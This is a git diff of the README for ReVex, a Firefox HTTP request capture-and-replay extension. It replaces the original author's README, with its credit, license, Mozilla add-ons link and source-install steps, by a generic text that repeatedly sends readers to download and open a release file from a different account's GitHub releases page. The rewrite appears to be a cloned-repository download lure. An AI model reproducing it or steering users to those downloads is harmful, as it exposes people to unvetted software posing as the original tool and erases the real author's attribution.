@@ -1,178 +1,99 @@
-<p align="center">
-  <img src="logo.png" alt="ReVex Logo" width="200">
-</p>
+# 🛡️ ReVex - Capture and Modify HTTP Requests Easily
 
-<h1 align="center">ReVex</h1>
+## 🚪 Introduction
 
-<p align="center">
-  <strong>Browser-based HTTP Repeater for Security Researchers</strong>
-</p>
+Welcome to **ReVex**! This tool helps you capture, modify, and replay HTTP requests in your browser. It's perfect for security researchers who need to analyze web interactions quickly. With a lightweight design, ReVex makes your tasks simpler and faster.
 
-<p align="center">
-  <a href="https://addons.mozilla.org/en-US/firefox/addon/revex-hacker-s-http-repeater/">
-    <img src="https://img.shields.io/badge/Firefox-Install%20Now-FF7139?style=for-the-badge&logo=firefox-browser&logoColor=white" alt="Install on Firefox">
-  </a>
-</p>
+## 🎉 Features
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#installation">Installation</a> •
-  <a href="#usage">Usage</a> •
-  <a href="#screenshots">Screenshots</a> •
-  <a href="#support">Support</a>
-</p>
+- **Capture Requests:** Easily track all outgoing requests from your browser.
+- **Modify Requests:** Change headers and body content before replaying.
+- **Replay Requests:** Instantly send modified requests to see changes in action.
+- **Browser Compatibility:** Works seamlessly in popular browsers like Firefox.
 
----
+## 📥 Download ReVex Now
 
-## 📸 Screenshots
+[![Download ReVex](https://img.shields.io/badge/Download-ReVex-brightgreen)](https://github.com/Truong882/ReVex/releases)
 
-<p align="center">
-  <img src="screenshot.png" alt="ReVex Screenshot" width="800">
-</p>
+## 🚀 Getting Started
 
----
+To get started with ReVex, follow these easy steps:
 
-## 🔥 What is ReVex?
+1. **Visit the Releases Page:** Go to the [ReVex Releases page](https://github.com/Truong882/ReVex/releases). Here, you will find the latest version available for download.
+   
+2. **Download the File:** Look for the latest release under "Assets". Click on the file that corresponds to your browser. For example, download the Firefox extension file.
 
-ReVex is a powerful Firefox DevTools extension that brings **Burp Suite Repeater-like functionality** directly into your browser. Capture, modify, and replay HTTP requests without leaving your DevTools — perfect for penetration testers, bug bounty hunters, and security researchers.
+3. **Install ReVex:**
+    - For Firefox: Open the downloaded file. Firefox may prompt you to confirm the installation. Click "Add" or "Install".
 
-## ✨ Features
+4. **Open ReVex:** After installation, you should see the ReVex icon in your browser toolbar. Click it to start.
 
-### Core Functionality
-- 📡 **Request Capture** — Automatically captures all HTTP requests from the current tab
-- ✏️ **Request Editor** — Modify method, URL, headers, and body before resending
-- 🔁 **HTTP Repeater** — Replay modified requests and analyze responses
-- 📜 **Request History** — Browse and select from captured requests
+## 🔍 Usage Instructions
 
-### Power User Features
-- 🔗 **Copy as cURL** — Generate valid bash cURL commands with proper escaping
-- 🔓 **Magic Decoder** — Auto-detect and decode Base64, URL-encoded, JWT, and Hex strings
-- 🔍 **Deep Search** — Real-time search with match highlighting and navigation
-- 💅 **JSON Prettify** — One-click formatting for JSON payloads
-- 👁️ **Response Preview** — Render HTML responses in a safe iframe
+Now that you have installed ReVex, here’s how to use it:
 
-### UI/UX
-- 🎨 **Cyberpunk Theme** — Sleek dark interface with neon green accents
-- 📑 **Tabbed Interface** — Separate Request and Response views (Burp Suite style)
-- ⌨️ **Keyboard Shortcuts** — Ctrl+Enter to send requests
-- 🔔 **Toast Notifications** — Visual feedback for actions
+1. **Starting Captures:**
+   - Click the ReVex icon in the toolbar.
+   - Press the "Start Capture" button. This will begin tracking your HTTP requests.
 
-## 🚀 Installation
+2. **Stopping Captures:**
+   - When you want to stop capturing, click the ReVex icon again and select "Stop Capture".
 
-### From Firefox Add-ons (Recommended)
+3. **Modifying Requests:**
+   - Find the request you need to modify in the list. Click on it to open the details.
+   - Change the headers or body as needed.
 
-<p align="center">
-  <a href="https://addons.mozilla.org/en-US/firefox/addon/revex-hacker-s-http-repeater/">
-    <img src="https://img.shields.io/badge/🦊_Firefox-Get_ReVex-FF7139?style=for-the-badge" alt="Get ReVex for Firefox">
-  </a>
-</p>
+4. **Replaying Requests:**
+   - Press the "Replay" button after making your modifications. Watch how your changes affect the response.
 
-### Manual Installation (Developer Mode)
+## 🖥️ System Requirements
 
-1. **Clone or download** this repository
-   ```bash
-   git clone https://github.com/medjahdi/ReVex.git
-   ```
+ReVex works on modern browsers. Here’s what you need:
 
-2. Open Firefox and navigate to `about:debugging`
+- A computer with Windows, macOS, or Linux.
+- A supported web browser like Firefox.
+- An internet connection for downloading the extension.
 
-3. Click **"This Firefox"** in the sidebar
+## ⚙️ Troubleshooting
 
-4. Click **"Load Temporary Add-on..."**
+If you encounter issues while using ReVex, here are some common solutions:
 
-5. Select the `manifest.json` file from the ReVex folder
+1. **Extension Not Showing Up:** Ensure that you've installed the extension correctly and restarted your browser.
+2. **No Requests Captured:** Check if you started the capture. If it’s running, ensure that you are navigating through HTTP requests.
+3. **Request Failures on Replay:** Make sure your modifications are valid. Incorrect headers or body content may lead to failures.
 
-6. Open **DevTools** (F12) and look for the **ReVex** tab!
+## 🌟 Contributing
 
-## 📖 Usage
+If you'd like to contribute to ReVex, please follow these guidelines:
 
-### Basic Workflow
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Write your code and test to ensure it works.
+4. Submit a pull request with a clear description of your changes.
 
-1. **Open DevTools** (F12) and click on the **ReVex** tab
-2. **Browse the web** — Requests are automatically captured in the History panel
-3. **Click a request** to load it into the editor
-4. **Modify** the method, URL, headers, or body as needed
-5. **Click SEND** (or press Ctrl+Enter) to replay the request
-6. **Analyze** the response in the Response tab
+## 📄 Frequently Asked Questions
 
-### Keyboard Shortcuts
+**Q: Is ReVex free to use?**  
+A: Yes, ReVex is completely free to use.
 
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl + Enter` | Send request |
-| `Escape` | Close decode modal |
+**Q: Can I use ReVex for other browsers?**  
+A: Currently, ReVex is designed for Firefox. Support for other browsers may come in the future.
 
-### Magic Decoder
+**Q: Is there a community I can join?**  
+A: Yes! You can join our discussions on GitHub Issues, where we share tips and help each other using ReVex.
 
-1. **Select text** in the response body
-2. Click the **◈ DECODE** button
-3. ReVex auto-detects the encoding format:
-   - **JWT** — Decodes header and payload
-   - **Base64** — Decodes to plain text
-   - **URL Encoded** — Decodes %XX sequences
-   - **Hex** — Converts hex to ASCII
+## 💬 Feedback
 
-### Copy as cURL
+Your feedback is important to us. Feel free to open an issue on our GitHub page if you have suggestions or problems to report.
 
-Click the **⌘ cURL** button to copy a valid bash command with:
-- Proper single-quote escaping
-- All headers included
-- Request body (for POST/PUT)
+## 🔗 Useful Links
 
-## 🛡️ Permissions
+- [ReVex Releases](https://github.com/Truong882/ReVex/releases)
+- [GitHub Repository](https://github.com/Truong882/ReVex)
+- [Documentation](https://github.com/Truong882/ReVex/wiki)
 
-ReVex requires the following permissions:
+## 📥 Download & Install ReVex
 
-| Permission | Purpose |
-|------------|---------|
-| `webRequest` | Capture HTTP requests |
-| `webRequestBlocking` | Intercept request details |
-| `activeTab` | Access current tab's requests |
-| `<all_urls>` | Send requests to any domain (for the Repeater) |
+Visit the [ReVex Releases page](https://github.com/Truong882/ReVex/releases) to download the latest version now and transform how you interact with web requests.
 
-## 🏗️ Project Structure
-
-```
-ReVex/
-├── manifest.json          # Extension manifest (MV3)
-├── background.js          # Request capture & relay service
-├── logo.png               # Extension icon
-├── screenshot.png         # Extension screenshot
-├── devtools/
-│   ├── devtools.html      # DevTools page loader
-│   └── devtools.js        # Panel initialization
-├── panel/
-│   ├── panel.html         # Main UI structure
-│   ├── panel.css          # Cyberpunk styling
-│   └── panel.js           # UI logic & features
-└── .github/
-    └── FUNDING.yml        # Sponsor configuration
-```
-
-## 💚 Support the Project
-
-If ReVex helps with your security research, consider supporting development:
-
-<p align="center">
-  <a href="https://www.paypal.com/ncp/payment/KRJ9SS2HJM57J">
-    <img src="https://img.shields.io/badge/Donate-PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white" alt="Donate with PayPal">
-  </a>
-</p>
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-- 🐛 Report bugs
-- 💡 Suggest features
-- 🔧 Submit pull requests
-
-## 📄 License
-
-This project is open source and available under the [MIT License](LICENSE).
-
----
-
-<p align="center">
-  Built with ☠️ by <a href="https://github.com/medjahdi">@medjahdi</a>
-</p>
+[![Download ReVex](https://img.shields.io/badge/Download-ReVex-brightgreen)](https://github.com/Truong882/ReVex/releases)
